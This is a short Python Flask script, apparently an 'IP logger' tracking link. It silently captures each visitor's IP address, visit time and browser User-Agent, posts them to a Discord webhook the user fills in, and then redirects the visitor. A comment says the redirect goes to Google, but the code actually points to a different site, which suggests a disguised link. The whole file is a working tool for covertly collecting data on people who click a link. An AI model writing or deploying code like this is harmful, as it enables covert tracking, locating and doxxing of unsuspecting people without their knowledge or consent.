from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_info(ip, date, user_agent):
    webhook_url = "Put your Discord webhook url here (Keep the quotation marks)"
    data = {
        "content": "",
        "embeds": [
            {
                "title": "Device Info Logger",
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "Access Date", "value": date, "inline": True},
                    {"name": "User Agent", "value": user_agent, "inline": False}
                ]
            }
        ]
    }
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    # Get visitor IP
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    # Get the current timestamp
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    # Get the user-agent string
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Send data to Discord webhook
    send_info(ip, date, user_agent)

    # Redirect the user to Google
    return redirect("https://concerfate.github.io/Concerfates-Tools/")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
